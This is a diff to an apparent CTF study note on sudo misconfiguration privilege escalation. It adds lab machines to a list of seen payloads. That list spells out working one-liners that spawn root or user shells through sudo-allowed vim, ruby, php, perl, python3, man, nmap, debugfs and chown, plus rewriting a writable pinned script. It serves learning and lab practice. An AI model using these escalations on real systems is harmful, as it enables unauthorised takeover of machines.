@@ -18,14 +18,15 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 ## Payloads seen
 
 - `sudo vim -c ':!/bin/sh' /dev/null` → root ([[trust]], [[obsession]], [[simple-ctf]]).
-- `sudo ruby -e 'exec "/bin/sh"'` → root ([[vacaciones]]).
+- `sudo ruby -e 'exec "/bin/sh"'` → root ([[vacaciones]], [[amor]] as `sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'`).
 - `(sonic) NOPASSWD: ALL` → `sudo -u sonic ...`, then `(ALL) NOPASSWD: ALL` → `sudo su` ([[hedgehog]]).
 - `sudo` group membership + `NOPASSWD: /bin/bash` → `sudo su` ([[borazuwara]]).
 - `(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img` → `debugfs: !/bin/bash` escapes to a shell as `hannah` ([[hannah-coffee]]).
 - `(chocolate) NOPASSWD: /usr/bin/php` → `sudo -u chocolate php -r 'system("/bin/sh -i")'` → shell as `chocolate` ([[balulero]]).
 - `(ALL) NOPASSWD: /usr/bin/node /home/mario/script.js` → overwrite `script.js` with a shell spawn → `sudo -u root ...` → root ([[nodeclimb]]).
 - `(luisillo) NOPASSWD: /usr/bin/perl` → `sudo -u luisillo perl -e 'exec "/bin/sh"'` → shell as `luisillo` ([[psycho]]).
-- `(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py` + writable `/opt` dir → `rm /opt/paw.py` and rewrite with a shell spawn → root ([[psycho]]).
+- `(pinguinito) NOPASSWD: /usr/bin/python3` → no pinned file at all, so the payload rides in the flag: `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash")'` → shell as `pinguinito` ([[secretjenkins]]) — the lateral hop has *nothing* pinned; its root rule two steps later does, and the payload moves into the file.
+- `(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py` + writable `/opt` dir → `rm /opt/paw.py` and rewrite with a shell spawn → root ([[psycho]], [[secretjenkins]] did it byte-for-byte with `mv /opt/script.py /opt/script.py.bak` + rewrite).
 - `(pingu) NOPASSWD: /usr/bin/man` → `sudo -u pingu man man`, then `!/bin/bash` inside the pager → shell as `pingu` ([[anonymous-pingu]]).
 - `(gladys) NOPASSWD: /usr/bin/nmap` → `nmap --script=/tmp/shell.nse` with `os.execute("/bin/sh <&1 >&1 2>&1")` → shell as `gladys` ([[anonymous-pingu]]).
 - `(root) NOPASSWD: /usr/bin/chown` → take ownership of `/etc/passwd`, blank root's password → `su -` ([[anonymous-pingu]], see [[writable-etc-passwd]]).
@@ -53,4 +54,4 @@ The entry you need is usually on the account you *just became*, not the one you 
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]], [[dockerlabs-box]], [[jenkhack]], [[library]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]], [[dockerlabs-box]], [[jenkhack]], [[library]], [[secretjenkins]], [[amor]]
